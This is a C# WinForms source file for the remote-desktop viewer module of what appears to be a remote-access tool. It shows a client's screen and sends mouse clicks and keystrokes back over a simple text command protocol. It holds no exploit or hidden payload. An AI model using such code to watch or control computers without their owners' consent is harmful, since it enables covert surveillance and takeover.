// Dosya: Modules/DesktopViewerForm.cs
//using App.Service.Modules;
using System;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Windows.Forms;

namespace App.Service
{
    public class DesktopViewerForm : ModuleForm, IRemoteModule
    {
        PictureBox _pic;
        Label _status;
        TextBox _keys;
        ComboBox _monitors;
        ComboBox _quality;
        Action<string> _send;
        int _ow = 1, _oh = 1;
        bool _live;

        volatile string _pending;
        bool _pumpBusy;
        MemoryStream _stream;
        int _statusTick;

        public DesktopViewerForm() : base("Masaüstü")
        {
            Size = new Size(1120, 740);
            MinimumSize = new Size(620, 440);

            _pic = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.Zoom, BackColor = Color.Black };
            Ui.Buffered(_pic);
            _pic.MouseDown += SendMouse;

            _status = new Label
            {
                Dock = DockStyle.Top,
                Height = S(24),
                TextAlign = ContentAlignment.MiddleCenter,
                ForeColor = Theme.Current.Ok,
                BackColor = Theme.Current.Title,
                Text = "Yayın başlatılıyor..."
            };

            var bar = new BufferedPanel { Dock = DockStyle.Bottom, Height = S(36), BackColor = Theme.Current.Side, Padding = new Padding(S(6)), Tag = "side" };

            _monitors = new ComboBox { Dock = DockStyle.Left, Width = S(126), DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, Font = Ui.F(8.5f) };
            _monitors.Items.Add("Tüm ekranlar");
            _monitors.SelectedIndex = 0;
            _monitors.SelectedIndexChanged += (s, e) => Restart();

            _quality = new ComboBox { Dock = DockStyle.Left, Width = S(104), DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, Font = Ui.F(8.5f) };
            _quality.Items.AddRange(new object[] { "Düşük", "Orta", "Yüksek" });
            _quality.SelectedIndex = 1;
            _quality.SelectedIndexChanged += (s, e) => Restart();

            _keys = new TextBox { Dock = DockStyle.Fill, BorderStyle = BorderStyle.None, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, Font = Ui.F(8.5f) };
            _keys.KeyDown += (s, e) =>
            {
                if (e.KeyCode != Keys.Enter) return;
                e.SuppressKeyPress = true;
                if (_keys.TextLength > 0 && _send != null) { _send("KEYS|" + _keys.Text); _keys.Clear(); }
            };

            bar.Controls.Add(_keys);
            bar.Controls.Add(_quality);
            bar.Controls.Add(_monitors);

            Body.Controls.Add(_pic);
            Body.Controls.Add(_status);
            Body.Controls.Add(bar);

            FormClosed += (s, e) =>
            {
                if (_live) { _live = false; try { if (_send != null) _send("RD|STOP"); } catch { } }
                var st = _stream;
                _stream = null;
                if (st != null) { try { st.Dispose(); } catch { } }
            };
        }

        public void Initialize(ClientSession s, Action<string> send)
        {
            _send = send;
            Title.Text = "Masaüstü - " + s.UserPc;

            for (int i = 0; i < Math.Max(1, s.Monitors); i++) _monitors.Items.Add("Ekran " + (i + 1));
            Shown += (e, a) => Start();
        }

        double RdScale { get { return _quality.SelectedIndex == 0 ? 0.5 : _quality.SelectedIndex == 2 ? 1.0 : 0.75; } }

        void Start()
        {
            if (_live || _send == null) return;
            _live = true;
            _send("RD|START|" + (_monitors.SelectedIndex - 1) + "|" + RdScale.ToString("0.##", CultureInfo.InvariantCulture));
        }

        void Restart()
        {
            if (_send == null) return;
            _send("RD|STOP");
            _live = false;
            var t = new System.Windows.Forms.Timer { Interval = 200 };
            t.Tick += (s, e) => { t.Stop(); t.Dispose(); Start(); };
            t.Start();
        }

        void SendMouse(object s, MouseEventArgs e)
        {
            if (_send == null) return;
            if (e.Button != MouseButtons.Left && e.Button != MouseButtons.Right) return;
            if (_pic.Image == null || _pic.Width <= 0 || _pic.Height <= 0) return;

            double scale = Math.Min((double)_pic.Width / Math.Max(1, _ow), (double)_pic.Height / Math.Max(1, _oh));
            if (scale <= 0) return;

            double ox = (_pic.Width - _ow * scale) / 2.0;
            double oy = (_pic.Height - _oh * scale) / 2.0;

            int x = (int)((e.X - ox) / scale);
            int y = (int)((e.Y - oy) / scale);
            if (x < 0 || y < 0 || x >= _ow || y >= _oh) return;

            _send("MOUSE|" + x + "|" + y + "|" + (e.Button == MouseButtons.Left ? 1 : 2));
        }

        public void UpdateFrame(int w, int h, string b64)
        {
            if (IsDisposed) return;
            _ow = w;
            _oh = h;
            _pending = b64;

            if (InvokeRequired)
            {
                if (_pumpBusy) return;
                _pumpBusy = true;
                try { BeginInvoke((MethodInvoker)Pump); } catch { _pumpBusy = false; }
                return;
            }
            Pump();
        }

        void Pump()
        {
            try
            {
                while (!IsDisposed)
                {
                    string b64 = _pending;
                    if (b64 == null) break;
                    _pending = null;
                    if (!Decode(b64)) break;
                }
            }
            catch { }
            finally { _pumpBusy = false; }

            if (!IsDisposed && _pending != null && !_pumpBusy)
            {
                _pumpBusy = true;
                try { BeginInvoke((MethodInvoker)Pump); } catch { _pumpBusy = false; }
            }
        }

        bool Decode(string b64)
        {
            try
            {
                var ms = new MemoryStream(Convert.FromBase64String(b64));
                var img = Image.FromStream(ms);

                var oldImg = _pic.Image;
                var oldStream = _stream;

                _pic.Image = img;
                _stream = ms;

                if (oldImg != null) oldImg.Dispose();
                if (oldStream != null) { try { oldStream.Dispose(); } catch { } }

                int now = Environment.TickCount;
                if (unchecked(now - _statusTick) > 500)
                {
                    _statusTick = now;
                    _status.Text = "Canlı - " + _ow + "x" + _oh;
                }
                return true;
            }
            catch { return false; }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (_pic != null && _pic.Image != null) { _pic.Image.Dispose(); _pic.Image = null; }
                if (_stream != null) { try { _stream.Dispose(); } catch { } _stream = null; }
            }
            base.Dispose(disposing);
        }
    }
}